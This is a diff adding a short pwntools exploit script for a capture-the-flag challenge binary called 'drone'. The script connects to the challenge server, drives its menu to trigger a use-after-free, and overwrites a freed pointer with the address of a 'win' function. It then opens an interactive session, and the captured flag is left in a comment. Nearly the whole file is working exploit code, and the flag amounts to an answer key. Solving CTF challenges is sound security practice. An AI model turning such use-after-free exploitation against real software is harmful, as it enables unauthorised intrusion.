@@ -1,0 +1,47 @@
+from pwn import *
+
+# UAF
+# note: printf(s) doesnt works normaly? maybe dif environment
+
+p = remote("uap.ctf.intigriti.io", 1340)
+#p = process("./drone")
+
+gdbscr = '''
+b *main
+b *main + 50
+b *menu + 74
+b *deploy_drone + 47
+b *retire_drone + 187
+b *enter_drone_route + 9
+b *enter_drone_route + 81
+'''
+
+#p = gdb.debug("./drone", gdbscript = gdbscr)
+
+e = ELF("./drone")
+win = e.symbols['print_drone_manual']
+
+#p.sendlineafter(b"Exit\n", b"1")
+#p.sendlineafter(b"Exit\n", b"1")
+
+p.sendlineafter(b"option: ", b"1")
+p.sendlineafter(b"option: ", b"1")
+
+#p.sendlineafter(b"Exit\n", b"2")
+p.sendlineafter(b"option: ", b"2")
+time.sleep(3)
+p.sendline(b"1")
+
+#p.sendlineafter(b"Exit\n", b"4")
+p.sendlineafter(b"option: ", b"4")
+time.sleep(3)
+payload = b"A" * 0x10 + p64(win)
+p.sendline(payload)
+
+#p.sendlineafter(b"Exit\n", b"3")
+p.sendlineafter(b"option: ", b"3")
+time.sleep(3)
+p.sendline(b"1")
+
+p.interactive()
+#INTIGRITI{un1d3n71f13d_fly1n6_vuln3r4b1l17y}
